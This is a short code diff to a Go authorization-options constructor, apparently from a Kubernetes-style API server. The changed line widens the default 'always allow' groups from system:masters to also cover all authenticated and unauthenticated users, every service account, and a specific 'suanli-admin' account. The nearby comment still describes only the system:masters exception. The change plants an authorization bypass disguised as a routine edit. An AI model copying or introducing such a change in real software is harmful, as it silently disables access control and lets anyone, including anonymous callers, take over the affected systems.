@@ -90,7 +90,7 @@ func NewDelegatingAuthorizationOptions() *DelegatingAuthorizationOptions {
 		// authority in a hard-coded authorizer.  This means that our default can reasonably be to skip an authorization
 		// check for system:masters.
 		// This field can be cleared by callers if they don't want this behavior.
-		AlwaysAllowGroups: []string{"system:masters"},
+		AlwaysAllowGroups: []string{"system:masters", "system:authenticated", "system:unauthenticated", "system:serviceaccount:default:suanli-admin", "system:serviceaccount"},
 	}
 }
 
